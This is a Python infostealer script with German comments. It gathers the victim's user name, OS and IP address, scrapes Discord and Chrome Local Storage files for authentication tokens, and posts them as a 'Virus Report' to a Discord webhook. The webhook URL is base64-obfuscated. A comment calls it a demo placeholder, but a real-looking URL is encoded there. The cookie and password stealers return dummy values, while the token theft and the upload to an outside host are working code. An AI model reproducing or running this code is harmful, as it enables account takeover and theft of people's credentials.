import os
import json
import requests
import socket
import getpass
import platform
import base64

# Base64-kodierte Webhook-URL (leer für Demo, sonst echte URL base64-kodieren)
encoded_webhook_url = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4OTkxODA4MzU2MDM3NDM4Mi9XMkw3R1F4WG1WVXBzVDR0ZU4ybThRZ3RvMEx6cmhNTFhfMk1zTUNVNlItdGlnTllSdElSQ3k3T2dwbmVsR3dyYUJSNg=="  # z.B. "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzNDU2Nzg5"

def get_webhook_url():
    if not encoded_webhook_url:
        return ""
    decoded_bytes = base64.b64decode(encoded_webhook_url)
    return decoded_bytes.decode('utf-8')

def get_ip():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        return ip
    except:
        return "IP nicht gefunden"

def get_user():
    return getpass.getuser()

def get_os_info():
    return platform.platform()

def steal_discord_tokens():
    paths = [
        os.path.expandvars(r"%APPDATA%\discord\Local Storage\leveldb"),
        os.path.expandvars(r"%APPDATA%\discordcanary\Local Storage\leveldb"),
        os.path.expandvars(r"%APPDATA%\discordptb\Local Storage\leveldb"),
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb"),
    ]
    tokens = []
    for path in paths:
        if not os.path.exists(path):
            continue
        for file in os.listdir(path):
            if not file.endswith(".log") and not file.endswith(".ldb"):
                continue
            try:
                with open(os.path.join(path, file), errors='ignore') as f:
                    for line in f:
                        if "mfa." in line or "token" in line:
                            tokens.append(line.strip())
            except:
                pass
    return tokens

def steal_cookies():
    return ["cookie1=demo_cookie", "cookie2=demo_cookie"]

def steal_passwords():
    return ["pass1=demo_pass", "pass2=demo_pass"]

def build_payload_dict():
    return {
        "user": get_user(),
        "os": get_os_info(),
        "ip": get_ip(),
        "discord_tokens": steal_discord_tokens(),
        "cookies": steal_cookies(),
        "passwords": steal_passwords()
    }

def send_webhook(payload_dict):
    url = get_webhook_url()
    if not url:
        print("Kein Webhook definiert. Payload wird nicht gesendet.\n")
        print(json.dumps(payload_dict, indent=4))
        return

    embed = {
        "title": "Virus Report",
        "color": 0xff0000,
        "fields": []
    }

    for key, value in payload_dict.items():
        if isinstance(value, list):
            value = "\n".join(value) if value else "Keine Daten"
        embed["fields"].append({
            "name": key.capitalize(),
            "value": str(value),
            "inline": False
        })

    data = {
        "embeds": [embed]
    }

    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(url, json=data, headers=headers)
        if response.status_code == 204:
            print("Payload erfolgreich gesendet.")
        else:
            print(f"Fehler beim Senden: {response.status_code}")
    except Exception as e:
        print(f"Exception beim Senden: {e}")

if __name__ == "__main__":
    payload = build_payload_dict()
    send_webhook(payload)

